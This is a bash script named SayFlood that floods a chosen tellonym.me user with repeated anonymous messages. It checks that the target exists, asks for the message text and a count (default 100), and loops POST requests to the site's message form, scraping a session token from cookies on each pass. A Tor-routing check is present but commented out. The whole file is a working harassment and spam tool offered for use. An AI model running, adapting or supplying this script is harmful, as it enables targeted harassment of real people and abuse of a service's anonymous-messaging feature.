#!/bin/bash
# SayFlood v1.2
# Author: https://github.com/thelinuxchoice/sayflood

banner() {

printf "\n"                                                
printf "\e[1;77m  ____              _____ _                 _  \n"
printf " / ___|  __ _ _   _|  ___| | ___   ___   __| | \n"
printf " \___ \ / _\` | | | | |_  | |/ _ \ / _ \ / _\` | \n"
printf "  ___) | (_| | |_| |  _| | | (_) | (_) | (_| | \n"
printf " |____/ \__,_|\__, |_|   |_|\___/ \___/ \__,_|v1.1 \n"
printf "              |___/\e[0m                            \n"
printf "\e[1;92m  Author: github.com/thelinuxchoice/sayflood\e[0m\n"
printf "\e[1;77m  @linux_choice\n\e[0m"
printf "\n"
}

checktor() {

checktor=$(curl -s --socks5-hostname localhost:9050 "https://check.torproject.org" > /dev/null; echo $?)

if [[ $checktor -gt 0 ]]; then
printf "\e[1;93m[!] It Requires Tor! Please, install it or check your TOR connection!\e[0m\n"
exit 1
fi

}


start() {

read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] tellonym.me Username: ' username
checkuser=$(curl -s -i https://tellonym.me/$username -L | grep -o 'The selected page was not found')

if [[ $checkuser == *'The selected page was not found'* ]]; then
printf "\e[1;93m[!] User Not Found, try again!\e[0m\n"
sleep 1
start
fi

IFS=$'\n'
default_amount="100"
default_message="sorry the flood"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Message: ' message
message="${message:-${default_message}}"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
amount="${amount:-${default_amount}}"

for i in $(seq 1 $amount); do
 
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
IFS=$'\n'
curl -i -L -s -c cookies.txt $'https://tellonym.me/'$username'' > /dev/null 2>&1
csam=$(grep  -o 'csam.*' cookies.txt | awk {'print $2'})

send=$(curl  -b cookies.txt -i -s -k  -X $'POST'     -H $'Host: tellonym.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://tellonym.me/'$username''  -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'write='$message'&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=IGMYbXFaaXNzTRAVS0RLGA%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam='$csam''     $'https://tellonym.me/'$username'' | grep -a 'HTTP/2 200' ;)

if [[ $send == *'HTTP/2 200'* ]]; then
printf "\e[1;92m Done\n\e[0m"

else
printf "\e[1;93m Fail\n\e[0m"
fi
#killall -HUP tor > /dev/null 2>&1
#sleep 1
done

exit 1
}
banner
#checktor
start

